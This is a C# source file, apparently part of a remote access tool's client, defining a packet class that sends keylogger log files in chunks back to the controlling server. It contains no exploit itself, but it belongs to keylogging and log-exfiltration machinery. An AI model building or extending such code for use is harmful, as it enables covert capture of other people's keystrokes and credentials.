using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetKeyloggerLogsResponse : IPacket
{
	public string Filename { get; set; }

	public byte[] Block { get; set; }

	public int MaxBlocks { get; set; }

	public int CurrentBlock { get; set; }

	public string CustomMessage { get; set; }

	public int Index { get; set; }

	public int FileCount { get; set; }

	public GetKeyloggerLogsResponse()
	{
	}

	public GetKeyloggerLogsResponse(string filename, byte[] block, int maxblocks, int currentblock, string custommessage, int index, int fileCount)
	{
		Filename = filename;
		Block = block;
		MaxBlocks = maxblocks;
		CurrentBlock = currentblock;
		CustomMessage = custommessage;
		Index = index;
		FileCount = fileCount;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
